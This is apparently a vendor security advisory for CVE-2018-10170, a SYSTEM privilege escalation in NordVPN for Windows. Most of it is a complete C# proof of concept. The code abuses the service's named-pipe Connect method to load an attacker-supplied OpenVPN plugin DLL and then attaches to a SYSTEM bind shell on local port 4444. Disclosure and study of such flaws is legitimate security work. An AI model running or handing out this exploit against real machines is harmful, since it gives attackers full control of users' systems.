### [VS-2018-018] NordVPN for Windows Privilege Escalation Vulnerability

```
Download: https://nordvpn.com/download/
CVE: CVE-2018-10170
Author: Fabius Watson of VerSprite Security
Affected: < 6.12.7.0
```

#### Vulnerability Details
NordVPN for Windows suffers from a `SYSTEM` privilege escalation vulnerability 
through the nordvpn-service service. This service establishes an `NetNamedPipe` 
endpoint that allows arbitrary installed applications to connect and call publicly 
exposed methods. The `Connect` method accepts a class instance argument that provides 
attacker control of the `OpenVpn` command line. An attacker can specify a dynamic library 
plugin that should run for every new VPN connection attempt. This plugin will execute code 
in the context of the `SYSTEM` user.

#### Exploitation

#### PoC
```cs
using System;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.ServiceModel;
using NordVpn.ServiceProxy.Vpn;
using System.Net.Sockets;
using System.Threading;

namespace NordVPN_EoP_PoC
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("### NordVPN EoP PoC ###\n");

            Console.WriteLine("[+] Building OpenVPN Config from Template ...");
            string configPath = Directory.GetCurrentDirectory() + "\\config.ovpn";
            string configTemplate = Properties.Resources.ConfigTemplate;

            configTemplate += "\nplugin " + Directory.GetCurrentDirectory().Replace("\\", "\\\\") + "\\\\OpenVPN_PoC.dll";

            File.WriteAllText(configPath, configTemplate);

            IVpnEventsCallback callback = new VpnEventsCallback();

            DuplexChannelFactory<IVpnConnectionManagerProxy> vpnProxy =
                new DuplexChannelFactory<IVpnConnectionManagerProxy>(
                    new InstanceContext(callback),
                    new NetNamedPipeBinding(),
                    new EndpointAddress("net.pipe://localhost/nordvpn-service/ConnectionManager"));

            Console.WriteLine("[+] Creating \"VpnConnectionManager\" Client ...");
            IVpnConnectionManagerProxy vpnClient = vpnProxy.CreateChannel();
            if (vpnClient == null)
            {
                Console.WriteLine("[!] NULL \"VpnConnectionManager\" Client ...");
                return;
            }

            vpnClient.RegisterCallback();

            Console.WriteLine("[+] Building \"ServerConnectionProxy\" ...");
            OpenVpnConnectionProxy conn = new OpenVpnConnectionProxy();
            conn.UserName = "John";
            conn.Password = "Doe";


            Console.WriteLine("[+] Setting Connection OpenVPN \"config\" Path ...");
            conn.OpenVpnConfigPath = configPath;

            try
            {
                Console.WriteLine("[+] Sending \"Connect\" Request ...");
                Task connTask = vpnClient.Connect(conn);
                connTask.Wait();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to Connect to ConnectionManager");
                return;
            }

            TcpClient tcpClient = new TcpClient();
            Console.WriteLine("[+] Connecting to SYSTEM \"bind\" shell ...\n");

            tcpClient.Connect("127.0.0.1", 4444);
            NetworkStream tcpStream = tcpClient.GetStream();

            while (tcpClient.Connected)
            {

                Thread.Sleep(100);
                for (int i = tcpClient.Available; i > 0; Thread.Sleep(100), i = tcpClient.Available)
                {
                    byte[] in_buf = new byte[i];
                    tcpStream.Read(in_buf, 0, i);
                    Console.Write(Encoding.UTF8.GetString(in_buf, 0, in_buf.Length));
                }

                byte[] out_buf = new byte[257];
                out_buf = new ASCIIEncoding().GetBytes(Console.ReadLine() + "\n");

                try
                {
                    tcpStream.Write(out_buf, 0, out_buf.Length);
                }
                catch (IOException ex)
                {
                    break;
                }

            }

            tcpClient.Close();

        }
    }

    [CallbackBehavior(ConcurrencyMode = ConcurrencyMode.Single, UseSynchronizationContext = false)]
    public class VpnEventsCallback : IVpnEventsCallback
    {
        public void OnErrorOccured(OpenVpnErrorOccuredArgsProxy e)
        {
            throw new NotImplementedException();
        }

        public void OnStateChanged(OpenVpnStateChangedArgsProxy e)
        {
            throw new NotImplementedException();
        }
    }

    public class KillswitchBlockedConnectionEventArgs
    {
    }
}

```

